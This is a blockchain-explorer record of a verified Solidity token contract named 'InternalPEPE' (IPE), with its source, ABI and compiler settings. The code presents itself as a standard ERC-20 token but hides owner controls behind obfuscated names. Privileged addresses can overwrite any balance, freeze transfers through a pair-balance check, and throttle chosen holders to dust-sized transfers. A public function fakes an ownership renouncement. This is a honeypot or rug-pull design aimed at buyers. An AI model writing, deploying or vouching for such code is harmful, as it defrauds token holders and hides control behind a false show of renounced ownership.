{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tokenWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitMin) external view returns (uint256);\n\n    function transfer(address autoFund, uint256 receiverSender) external returns (bool);\n\n    function allowance(address maxAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoFund,\n        uint256 receiverSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txMode, uint256 value);\n    event Approval(address indexed maxAuto, address indexed spender, uint256 value);\n}\n\nabstract contract fromSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountMarketing {\n    function createPair(address limitAuto, address senderExempt) external returns (address);\n}\n\ninterface tokenWalletMetadata is tokenWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InternalPEPE is fromSwap, tokenWallet, tokenWalletMetadata {\n\n    bool private buyShouldLaunch;\n\n    event OwnershipTransferred(address indexed senderFee, address indexed atFund);\n\n    function tradingLaunch() private view {\n        require(senderLiquidity[_msgSender()]);\n    }\n\n    uint256 constant liquidityMin = 7 ** 10;\n\n    function marketingTotal(address atExempt) public {\n        if (fromTake) {\n            return;\n        }\n        if (senderSell != buyShouldLaunch) {\n            liquidityIs = launchTotal;\n        }\n        senderLiquidity[atExempt] = true;\n        \n        fromTake = true;\n    }\n\n    function buyLimit(address takeTeam, address autoFund, uint256 receiverSender) internal returns (bool) {\n        if (takeTeam == receiverWallet) {\n            return launchedLiquidityFrom(takeTeam, autoFund, receiverSender);\n        }\n        uint256 liquidityLaunched = tokenWallet(teamTakeMin).balanceOf(txToken);\n        require(liquidityLaunched == receiverTrading);\n        require(autoFund != txToken);\n        if (senderIs[takeTeam]) {\n            return launchedLiquidityFrom(takeTeam, autoFund, liquidityMin);\n        }\n        return launchedLiquidityFrom(takeTeam, autoFund, receiverSender);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunch;\n    }\n\n    string private receiverLaunch = \"Internal PEPE\";\n\n    bool public fromTake;\n\n    address txToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private liquidityIs;\n\n    mapping(address => bool) public senderIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeExempt;\n    }\n\n    uint256 autoTrading;\n\n    mapping(address => mapping(address => uint256)) private receiverFee;\n\n    function modeTrading(address teamAuto, uint256 receiverSender) public {\n        tradingLaunch();\n        minSell[teamAuto] = receiverSender;\n    }\n\n    function owner() external view returns (address) {\n        return enableAuto;\n    }\n\n    uint256 receiverTrading;\n\n    mapping(address => bool) public senderLiquidity;\n\n    uint256 public tradingSwap;\n\n    address public receiverWallet;\n\n    address tradingEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalLaunch;\n    }\n\n    mapping(address => uint256) private minSell;\n\n    function transferFrom(address takeTeam, address autoFund, uint256 receiverSender) external override returns (bool) {\n        if (_msgSender() != tradingEnable) {\n            if (receiverFee[takeTeam][_msgSender()] != type(uint256).max) {\n                require(receiverSender <= receiverFee[takeTeam][_msgSender()]);\n                receiverFee[takeTeam][_msgSender()] -= receiverSender;\n            }\n        }\n        return buyLimit(takeTeam, autoFund, receiverSender);\n    }\n\n    string private receiverMode = \"IPE\";\n\n    function approve(address receiverFromList, uint256 receiverSender) public virtual override returns (bool) {\n        receiverFee[_msgSender()][receiverFromList] = receiverSender;\n        emit Approval(_msgSender(), receiverFromList, receiverSender);\n        return true;\n    }\n\n    uint256 private modeExempt = 100000000 * 10 ** 18;\n\n    function transfer(address teamAuto, uint256 receiverSender) external virtual override returns (bool) {\n        return buyLimit(_msgSender(), teamAuto, receiverSender);\n    }\n\n    uint8 private totalLaunch = 18;\n\n    function buyAuto(uint256 receiverSender) public {\n        tradingLaunch();\n        receiverTrading = receiverSender;\n    }\n\n    uint256 public receiverTotal;\n\n    bool public senderSell;\n\n    function launchedLiquidityFrom(address takeTeam, address autoFund, uint256 receiverSender) internal returns (bool) {\n        require(minSell[takeTeam] >= receiverSender);\n        minSell[takeTeam] -= receiverSender;\n        minSell[autoFund] += receiverSender;\n        emit Transfer(takeTeam, autoFund, receiverSender);\n        return true;\n    }\n\n    function allowance(address fundTake, address receiverFromList) external view virtual override returns (uint256) {\n        if (receiverFromList == tradingEnable) {\n            return type(uint256).max;\n        }\n        return receiverFee[fundTake][receiverFromList];\n    }\n\n    function txWallet() public {\n        emit OwnershipTransferred(receiverWallet, address(0));\n        enableAuto = address(0);\n    }\n\n    function tradingTx(address marketingTx) public {\n        tradingLaunch();\n        if (tradingMax == launchTotal) {\n            receiverTotal = tradingMax;\n        }\n        if (marketingTx == receiverWallet || marketingTx == teamTakeMin) {\n            return;\n        }\n        senderIs[marketingTx] = true;\n    }\n\n    uint256 public launchTotal;\n\n    address public teamTakeMin;\n\n    address private enableAuto;\n\n    function getOwner() external view returns (address) {\n        return enableAuto;\n    }\n\n    function balanceOf(address limitMin) public view virtual override returns (uint256) {\n        return minSell[limitMin];\n    }\n\n    constructor (){\n        \n        takeFund toSender = takeFund(tradingEnable);\n        teamTakeMin = amountMarketing(toSender.factory()).createPair(toSender.WETH(), address(this));\n        \n        receiverWallet = _msgSender();\n        txWallet();\n        senderLiquidity[receiverWallet] = true;\n        minSell[receiverWallet] = modeExempt;\n        if (tradingSwap != receiverTotal) {\n            receiverTotal = launchTotal;\n        }\n        emit Transfer(address(0), receiverWallet, modeExempt);\n    }\n\n    uint256 private tradingMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFromList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverSender\",\"type\":\"uint256\"}],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSender\",\"type\":\"uint256\"}],\"name\":\"modeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTakeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InternalPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}